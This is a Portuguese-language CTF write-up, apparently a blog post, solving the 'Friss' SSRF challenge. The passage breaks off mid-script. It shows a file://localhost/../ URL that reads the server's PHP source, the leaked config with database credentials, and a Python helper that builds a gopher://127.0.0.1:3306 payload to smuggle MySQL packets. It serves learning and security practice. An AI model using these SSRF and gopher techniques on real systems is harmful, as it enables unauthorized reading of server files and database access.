---
title: "Friss SSRF - Writeup"
layout: post
date: 2018-07-28
category: writeup
---
<style>* {-webkit-tap-highlight-color: rgba(0,0,0,0);}html {-webkit-text-size-adjust: none;}body {font-family: -apple-system, Helvetica, Arial, sans-serif;margin: 0;padding: 20px;color: #333;word-wrap: break-word;}h1, h2, h3, h4, h5, h6 {line-height: 1.1;}img {max-width: 100% !important;height: auto;}blockquote {margin: 0;padding: 0 15px;color: #777;border-left: 4px solid #ddd;}hr {background-color: #ddd;border: 0;height: 1px;margin: 15px 0;}code {font-family: Menlo, Consolas, 'Ubuntu Mono', Monaco, 'source-code-pro', monospace;line-height: 1.4;margin: 0;padding: 0.2em 0;font-size: 90%;background-color: rgba(0,0,0,0.04);border-radius: 3px;}pre > code {margin: 0;padding: 0;font-size: 100%;word-break: normal;background: transparent;border: 0;}ol {list-style-type: decimal;}ol ol, ul ol {list-style-type: lower-latin;}ol ol ol, ul ol ol, ul ul ol, ol ul ol {list-style-type: lower-roman;}table {border-spacing: 0;border-collapse: collapse;margin-top: 0;margin-bottom: 16px;}table th {font-weight: bold;}table th, table td {padding: 6px 13px;border: 1px solid #ddd;}table tr {border-top: 1px solid #ccc;}table tr:nth-child(even) {background-color: #f8f8f8;}input[type="checkbox"] {cursor: default;margin-right: 0.5em;font-size: 13px;}.task-list-item {list-style-type: none;}.task-list-item+.task-list-item {margin-top: 3px;}.task-list-item input {float: left;margin: 0.3em 1em 0.25em -1.6em;vertical-align: middle;}#tag-field {margin: 8px 2px 10px;}#tag-field .tag {display: inline-block;background: #cadff3;border-radius: 4px;padding: 1px 8px;color: black;font-size: 12px;margin-right: 10px;line-height: 1.4;}</style>
      <!-- ace-static.css -->
      <style>.ace_static_highlight {white-space: pre-wrap;}.ace_static_highlight .ace_gutter {width: 2em;text-align: right;padding: 0 3px 0 0;margin-right: 3px;}.ace_static_highlight.ace_show_gutter > .ace_line {padding-left: 2.6em;}.ace_static_highlight .ace_line {position: relative;}.ace_static_highlight .ace_gutter-cell {-moz-user-select: -moz-none;-khtml-user-select: none;-webkit-user-select: none;user-select: none;top: 0;bottom: 0;left: 0;position: absolute;}.ace_static_highlight .ace_gutter-cell:before {content: counter(ace_line, decimal);counter-increment: ace_line;}.ace_static_highlight {counter-reset: ace_line;}</style>
      <style>.ace-monokai .ace_gutter {background: #2F3129;color: #8F908A}.ace-monokai .ace_print-margin {width: 1px;background: #555651}.ace-monokai {background-color: #272822;color: #F8F8F2}.ace-monokai .ace_cursor {color: #F8F8F0}.ace-monokai .ace_marker-layer .ace_selection {background: #49483E}.ace-monokai.ace_multiselect .ace_selection.ace_start {box-shadow: 0 0 3px 0px #272822;}.ace-monokai .ace_marker-layer .ace_step {background: rgb(102, 82, 0)}.ace-monokai .ace_marker-layer .ace_bracket {margin: -1px 0 0 -1px;border: 1px solid #49483E}.ace-monokai .ace_marker-layer .ace_active-line {background: #202020}.ace-monokai .ace_gutter-active-line {background-color: #272727}.ace-monokai .ace_marker-layer .ace_selected-word {border: 1px solid #49483E}.ace-monokai .ace_invisible {color: #52524d}.ace-monokai .ace_entity.ace_name.ace_tag,.ace-monokai .ace_keyword,.ace-monokai .ace_meta.ace_tag,.ace-monokai .ace_storage {color: #F92672}.ace-monokai .ace_punctuation,.ace-monokai .ace_punctuation.ace_tag {color: #fff}.ace-monokai .ace_constant.ace_character,.ace-monokai .ace_constant.ace_language,.ace-monokai .ace_constant.ace_numeric,.ace-monokai .ace_constant.ace_other {color: #AE81FF}.ace-monokai .ace_invalid {color: #F8F8F0;background-color: #F92672}.ace-monokai .ace_invalid.ace_deprecated {color: #F8F8F0;background-color: #AE81FF}.ace-monokai .ace_support.ace_constant,.ace-monokai .ace_support.ace_function {color: #66D9EF}.ace-monokai .ace_fold {background-color: #A6E22E;border-color: #F8F8F2}.ace-monokai .ace_storage.ace_type,.ace-monokai .ace_support.ace_class,.ace-monokai .ace_support.ace_type {font-style: italic;color: #66D9EF}.ace-monokai .ace_entity.ace_name.ace_function,.ace-monokai .ace_entity.ace_other,.ace-monokai .ace_entity.ace_other.ace_attribute-name,.ace-monokai .ace_variable {color: #A6E22E}.ace-monokai .ace_variable.ace_parameter {font-style: italic;color: #FD971F}.ace-monokai .ace_string {color: #E6DB74}.ace-monokai .ace_comment {color: #75715E}.ace-monokai .ace_indent-guide {background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAACCAYAAACZgbYnAAAAEklEQVQImWPQ0FD0ZXBzd/wPAAjVAoxeSgNeAAAAAElFTkSuQmCC) right repeat-y}</style>
      <!-- export.css -->
      <style>
        body{margin:0 auto;max-width:800px;line-height:1.4}
        #nav{margin:5px 0 10px;font-size:15px}
        #titlearea{border-bottom:1px solid #ccc;font-size:17px;padding:10px 0;}
        #contentarea{font-size:15px;margin:16px 0}
        .cell{outline:0;min-height:20px;margin:5px 0;padding:5px 0;}
        .code-cell{font-family:Menlo,Consolas,'Ubuntu Mono',Monaco,'source-code-pro',monospace;font-size:12px;}
        .latex-cell{white-space:pre-wrap;}
      </style>
      <!-- User CSS -->
      <style> .text-cell {font-size: 15px;}.code-cell {font-size: 12px;}.markdown-cell {font-size: 15px;}.latex-cell {font-size: 15px;}</style>
<div id="titlearea">
        <h2>Friss</h2>
      </div>
      <div id="contentarea"><div class="cell text-cell"><div>Está challenge aconteceu este final de semana e eu gostei muito da resolução dela, e também gostei que eu fui o primeiro a matar ela :)&nbsp;</div><div><br></div><div><img src="resources/3ACD871BCA909B5A66EC5CFDDAD0FD72.png" alt="firstblood.png" width="495" height="365"><br></div><div><br></div><div><br></div><div><img src="resources/48BB00B0E0268861E3DAFE7A5487D5F6.png" alt="ssrf0x1.png" width="1440" height="827"><br></div><div>Bem, entrando na challenge não tinhamos muita coisa para fazer, haviamos um input e um botão, basicamente indicando que tinhamos um curl sendo executado, a primeira coisa que tentei, foi tentar enviar algo para o google.com e ver se retornava algum valor:</div><div><img src="resources/E7BAFF00283180B855CC72BBA95E82FA.png" alt="ssrf0x2.png" width="1440" height="827"><br></div><div><img src="resources/1D61A464434BB7A9AFC2F17893FF7358.png" alt="ssrf0x3.png" width="1440" height="827"><br></div><div>Bem, parece que só podemos enviar coisas para o localhost, então, indo um pouco a fundo, podemos achar um pequeno bypass para isso, já que a aplicação não está barrando wrappers, temos a possibilidade de utilizar o file:// aqui:</div></div><div class="cell text-cell"></div><div class="cell text-cell"></div><div class="cell code-cell"><div class="ace-monokai"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_identifier">php</span> <span class="ace_keyword ace_operator">&gt;</span> <span class="ace_support ace_function">var_dump</span><span class="ace_paren ace_lparen">(</span><span class="ace_support ace_function">parse_url</span><span class="ace_paren ace_lparen">(</span><span class="ace_string">'file://localhost/../var/www/html/index.php"'</span><span class="ace_paren ace_rparen">))</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">array</span><span class="ace_paren ace_lparen">(</span><span class="ace_constant ace_numeric">3</span><span class="ace_paren ace_rparen">)</span> <span class="ace_paren ace_lparen">{</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_paren ace_lparen">[</span><span class="ace_string">"scheme"</span><span class="ace_paren ace_rparen">]</span><span class="ace_keyword ace_operator">=&gt;</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_identifier">string</span><span class="ace_paren ace_lparen">(</span><span class="ace_constant ace_numeric">4</span><span class="ace_paren ace_rparen">)</span> <span class="ace_string">"file"</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_paren ace_lparen">[</span><span class="ace_string">"host"</span><span class="ace_paren ace_rparen">]</span><span class="ace_keyword ace_operator">=&gt;</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_identifier">string</span><span class="ace_paren ace_lparen">(</span><span class="ace_constant ace_numeric">9</span><span class="ace_paren ace_rparen">)</span> <span class="ace_string">"localhost"</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_paren ace_lparen">[</span><span class="ace_string">"path"</span><span class="ace_paren ace_rparen">]</span><span class="ace_keyword ace_operator">=&gt;</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_identifier">string</span><span class="ace_paren ace_lparen">(</span><span class="ace_constant ace_numeric">27</span><span class="ace_paren ace_rparen">)</span> <span class="ace_string">"/../var/www/html/index.php""</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_string">}</span>
</div></div></div></div><div class="cell text-cell"><img src="resources/9087D654200CC73E7E4690927E883959.png" alt="ssrf0x4.png" width="1440" height="827"></div><div class="cell text-cell"><img src="resources/692360206D38F3F660A6E612822BFB12.png" alt="ssrf0x5.png" width="1440" height="827"><div>Ok, conseguimos o código da index, vamos dar uma olhada nele:</div></div><div class="cell code-cell"><div class="ace-monokai"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_support ace_function">include_once</span> <span class="ace_string">"config.php"</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">if</span> <span class="ace_paren ace_lparen">(</span><span class="ace_support ace_function">isset</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable ace_language">$_POST</span><span class="ace_paren ace_lparen">[</span><span class="ace_string">'url'</span><span class="ace_paren ace_rparen">])</span><span class="ace_keyword ace_operator">&amp;&amp;!</span><span class="ace_support ace_function">empty</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable ace_language">$_POST</span><span class="ace_paren ace_lparen">[</span><span class="ace_string">'url'</span><span class="ace_paren ace_rparen">]))</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_lparen">{</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_variable">$url</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_variable ace_language">$_POST</span><span class="ace_paren ace_lparen">[</span><span class="ace_string">'url'</span><span class="ace_paren ace_rparen">]</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_variable">$content_url</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_identifier">getUrlContent</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$url</span><span class="ace_paren ace_rparen">)</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_rparen">}</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">else</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_lparen">{</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_variable">$content_url</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_string">""</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_rparen">}</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">if</span><span class="ace_paren ace_lparen">(</span><span class="ace_support ace_function">isset</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable ace_language">$_GET</span><span class="ace_paren ace_lparen">[</span><span class="ace_string">'debug'</span><span class="ace_paren ace_rparen">]))</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_lparen">{</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_support ace_function">show_source</span><span class="ace_paren ace_lparen">(</span><span class="ace_constant ace_language">__FILE__</span><span class="ace_paren ace_rparen">)</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_rparen">}</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>?<span class="ace_keyword ace_operator">&gt;</span>
</div></div></div></div><div class="cell text-cell">que pena, eu não sabia que existia o debug aqui, mas ok, aqui não tem muito o que analisar, pois a função getUrlContent() está vindo muito provavelmente do config.php:</div><div class="cell text-cell"><img src="resources/8E26EA4FC72DC513AD77D665807F6949.png" alt="ssrf0x6.png" width="1440" height="827"></div><div class="cell text-cell">Aqui sim, temos o que analisar:</div><div class="cell code-cell"><div class="ace-monokai"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword ace_operator">&lt;</span>?<span class="ace_identifier">php</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_variable">$hosts</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_string">"localhost"</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_variable">$dbusername</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_string">"ssrf_user"</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_variable">$dbpasswd</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_string">""</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_variable">$dbname</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_string">"ssrf"</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_variable">$dbport</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_constant ace_numeric">3306</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_variable">$conn</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_support ace_function">mysqli_connect</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$hosts</span>,<span class="ace_variable">$dbusername</span>,<span class="ace_variable">$dbpasswd</span>,<span class="ace_variable">$dbname</span>,<span class="ace_variable">$dbport</span><span class="ace_paren ace_rparen">)</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">function</span> <span class="ace_identifier">initdb</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$conn</span><span class="ace_paren ace_rparen">)</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_lparen">{</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_variable">$dbinit</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_string">"create table if not exists flag(secret varchar(100));"</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_keyword">if</span><span class="ace_paren ace_lparen">(</span><span class="ace_identifier">mysqli_query</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$conn</span>,<span class="ace_variable">$dbinit</span><span class="ace_paren ace_rparen">))</span> <span class="ace_support ace_function">return</span> <span class="ace_constant ace_numeric">1</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_keyword">else</span> <span class="ace_support ace_function">return</span> <span class="ace_constant ace_numeric">0</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_rparen">}</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">function</span> <span class="ace_identifier">safe</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$url</span><span class="ace_paren ace_rparen">)</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_lparen">{</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_variable">$tmpurl</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_support ace_function">parse_url</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$url</span>, <span class="ace_identifier">PHP_URL_HOST</span><span class="ace_paren ace_rparen">)</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_keyword">if</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$tmpurl</span> <span class="ace_keyword ace_operator">!=</span> <span class="ace_string">"localhost"</span> <span class="ace_keyword">and</span> <span class="ace_variable">$tmpurl</span> <span class="ace_keyword ace_operator">!=</span> <span class="ace_string">"127.0.0.1"</span><span class="ace_paren ace_rparen">)</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_paren ace_lparen">{</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    <span class="ace_support ace_function">var_dump</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$tmpurl</span><span class="ace_paren ace_rparen">)</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    <span class="ace_support ace_function">die</span><span class="ace_paren ace_lparen">(</span><span class="ace_string">"&lt;h1&gt;Only access to localhost&lt;/h1&gt;"</span><span class="ace_paren ace_rparen">)</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_paren ace_rparen">}</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_support ace_function">return</span> <span class="ace_variable">$url</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_rparen">}</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">function</span> <span class="ace_identifier">getUrlContent</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$url</span><span class="ace_paren ace_rparen">)</span><span class="ace_paren ace_lparen">{</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_variable">$url</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_identifier">safe</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$url</span><span class="ace_paren ace_rparen">)</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_variable">$url</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_support ace_function">escapeshellarg</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$url</span><span class="ace_paren ace_rparen">)</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_variable">$pl</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_string">"curl "</span>.<span class="ace_variable">$url</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_support ace_function">echo</span> <span class="ace_variable">$pl</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_variable">$content</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_support ace_function">shell_exec</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$pl</span><span class="ace_paren ace_rparen">)</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    <span class="ace_support ace_function">return</span> <span class="ace_variable">$content</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_paren ace_rparen">}</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_identifier">initdb</span><span class="ace_paren ace_lparen">(</span><span class="ace_variable">$conn</span><span class="ace_paren ace_rparen">)</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>?<span class="ace_keyword ace_operator">&gt;</span>
</div></div></div></div><div class="cell text-cell">É sempre interessante quando temos usuarios,senhas e etc presentes no código, vamos guardar, pois pode nos ser util futuramente.<div>Analisando p initdb() você consegue ver que a função está criando um tabela chamada flag com uma coluna secret no banco de dados, caso ela ainda não exista...</div></div><div class="cell text-cell">A função safe() está pegando a url passada e verificando via parse_url() se o host bate com localhost ou 127.0.0.1, nenhuma verificação pesada aqui...</div><div class="cell text-cell">Bem, aqui no getUrlContent() eu confesso que cheguei a pensar que havia uma forma talvez nova de bypassar o escapeshellarg e conseguir injetar comandos, porém, não faria sentido algum isso, mas eu pensei nessa possibilidade…<div>Olhando para a função conseguimos ver que ela está usando o escapeshellarg para criar um escape nos argumentos do comando, logo abaixo é executado um shell_exec e retornado para o usuário.</div><div><br></div><div>Ok, pensando nas possibilidades, ficou muito claro que eu deveria persistir no ssrf, e talvez encontrar algum protocolo disponivel do qual eu conseguisse me aproveitar para conseguir uma shell talvez, então tentei ftp://,ssh://,dict:// e então gopher://…</div><div><br></div><div>Eu já havia estudado diversas vezes em formas de conseguir shell com o gopher, usando redis ou fastcgi em conjunto, mas nunca havia feito com mysql, encontrei alguns artigos que me indicaram que uma parte do formato do pacote do mysql, quando enviado na pilha tcp, seria o formato que o mysql entenderia caso pudessemos envia-lo por uma url, bem, é muito abstrato falar assim, vamos ver como isso funciona na prática, porém, antes, vamos criar um usuário igual ao do desafio “ssrf_user” em nosso mysql…</div><div><br></div></div><div class="cell code-cell"><div class="ace-monokai"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_identifier">mysql</span><span class="ace_keyword ace_operator">&gt;</span> <span class="ace_keyword">CREATE</span> <span class="ace_keyword">USER</span> <span class="ace_string ace_start">'</span><span class="ace_string">ssrf_user</span><span class="ace_string ace_end">'</span>@<span class="ace_string ace_start">'</span><span class="ace_string">localhost</span><span class="ace_string ace_end">'</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">Query</span> <span class="ace_identifier">OK</span>, <span class="ace_constant ace_numeric">0</span> <span class="ace_identifier">rows</span> <span class="ace_identifier">affected</span> <span class="ace_paren ace_lparen">(</span><span class="ace_constant ace_numeric">0</span>,<span class="ace_constant ace_numeric">07</span> <span class="ace_identifier">sec</span><span class="ace_paren ace_rparen">)</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_identifier">mysql</span><span class="ace_keyword ace_operator">&gt;</span> <span class="ace_keyword">GRANT</span> <span class="ace_keyword">USAGE</span> <span class="ace_keyword">ON</span> *.* <span class="ace_keyword">TO</span> <span class="ace_string ace_start">'</span><span class="ace_string">ssrf_user</span><span class="ace_string ace_end">'</span>@<span class="ace_string ace_start">'</span><span class="ace_string">localhost</span><span class="ace_string ace_end">'</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">Query</span> <span class="ace_identifier">OK</span>, <span class="ace_constant ace_numeric">0</span> <span class="ace_identifier">rows</span> <span class="ace_identifier">affected</span> <span class="ace_paren ace_lparen">(</span><span class="ace_constant ace_numeric">0</span>,<span class="ace_constant ace_numeric">01</span> <span class="ace_identifier">sec</span><span class="ace_paren ace_rparen">)</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_identifier">mysql</span><span class="ace_keyword ace_operator">&gt;</span> <span class="ace_keyword">GRANT</span> <span class="ace_keyword">ALL</span> <span class="ace_keyword">PRIVILEGES</span> *.* <span class="ace_keyword">TO</span> <span class="ace_string ace_start">'</span><span class="ace_string">ssrf_user</span><span class="ace_string ace_end">'</span>@<span class="ace_string ace_start">'</span><span class="ace_string">localhost</span><span class="ace_string ace_end">'</span>;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">Query</span> <span class="ace_identifier">OK</span>, <span class="ace_constant ace_numeric">0</span> <span class="ace_identifier">rows</span> <span class="ace_identifier">affected</span> <span class="ace_paren ace_lparen">(</span><span class="ace_constant ace_numeric">0</span>,<span class="ace_constant ace_numeric">10</span> <span class="ace_identifier">sec</span><span class="ace_paren ace_rparen">)</span>
</div></div></div></div><div class="cell text-cell">Ok, agora podemos prosseguir melhor. Vamos abrir o wireshark para ver como o protocolo vai se comportar quando enviarmos um pacote de conexao e login para o mysql:</div><div class="cell text-cell"><img src="resources/74956F0E9B4EF23C04C39C064895AA97.png" alt="ssrf0x8.png" width="1440" height="900"></div><div class="cell text-cell">Eu cheguei a fazer o login pelo mac, porém, o que eu percebi foi que o mey mysql do mac estava gerando de uma forma totalmente diferente da original o pacote de conexão, ele estava grande demais para apenas um login, então, abri um ubuntu com mysql e um wireshark para testar isso, mas basicamente o que precisamos selecionar é o ultimo segmento apresentado do pacote pelo wireshark, que é só a parte do pacote que a gente faz a tentativa de login:</div><div class="cell text-cell"><img src="resources/50A5308F210CDBC8249C0DC225B7C501.png" alt="ubuntu0x1.png" width="693" height="533"><div><br></div></div><div class="cell text-cell">A gente basicamente pode dividir essa comunicação do pacote do mysql e duas partes, a parte da conexão e a parte da execução dos comandos, aqui estamos apenas na parte da conexão, mas o que acontece para o formato dos dados ficar assim é que a primeira iteração antes do login, é do servidor, que envia um salt e o cliente do mysql criptografa a senha, neste simples caso, isto não ocorre.</div><div class="cell text-cell"><img src="resources/2D03947A258575CAB53BE3922239484E.png" alt="ubuntu0x2.png" width="693" height="533"><div><br></div><div>A partir daqui, precisamos fazer isso virar uma url, e a forma mais facil de fazer isso, é usar o input do “Show and save data as” e setar ele para “Raw”:</div></div><div class="cell text-cell"><img src="resources/DD7944A81E80C73445E7C895B7911549.png" alt="ubuntu_override.png" width="707" height="487"><br></div><div class="cell text-cell">Ok, agora, precisamos encodar isso tudo em um formato adequado para a url, na verdade não é muito dificil, bastaria adicionar % a cada dois bytes, mas eu encontrei um script que faz isso para nós:</div><div class="cell code-cell"><div class="ace-monokai"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">def</span> <span class="ace_identifier">result</span><span class="ace_paren ace_lparen">(</span><span class="ace_identifier">s</span><span class="ace_paren ace_rparen">)</span>:  
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_identifier">a</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_paren ace_lparen">[</span><span class="ace_identifier">s</span><span class="ace_paren ace_lparen">[</span><span class="ace_identifier">i</span>:<span class="ace_identifier">i</span><span class="ace_keyword ace_operator">+</span><span class="ace_constant ace_numeric">2</span><span class="ace_paren ace_rparen">]</span> <span class="ace_keyword">for</span> <span class="ace_identifier">i</span> <span class="ace_keyword">in</span> <span class="ace_support ace_function">xrange</span><span class="ace_paren ace_lparen">(</span><span class="ace_constant ace_numeric">0</span>, <span class="ace_support ace_function">len</span><span class="ace_paren ace_lparen">(</span><span class="ace_identifier">s</span><span class="ace_paren ace_rparen">)</span>, <span class="ace_constant ace_numeric">2</span><span class="ace_paren ace_rparen">)]</span>  
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_keyword">return</span> <span class="ace_string">"curl gopher://127.0.0.1:3306/_%"</span> <span class="ace_keyword ace_operator">+</span> <span class="ace_string">"%"</span>.<span class="ace_identifier">join</span><span class="ace_paren ace_lparen">(</span><span class="ace_identifier">a</span><span class="ace_paren ace_rparen">)</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_keyword">if</span> <span class="ace_identifier">__name__</span> <span class="ace_keyword ace_operator">==</span> <span class="ace_string">"__main__"</span>:  
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_keyword">import</span> <span class="ace_identifier">sys</span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_identifier">s</span> <span class="ace_keyword ace_operator">=</span> <span class="ace_identifier">sys</span>.<span class="ace_identifier">argv</span><span class="ace_paren ace_lparen">[</span><span class="ace_constant ace_numeric">1</span><span class="ace_paren ace_rparen">]</span>   
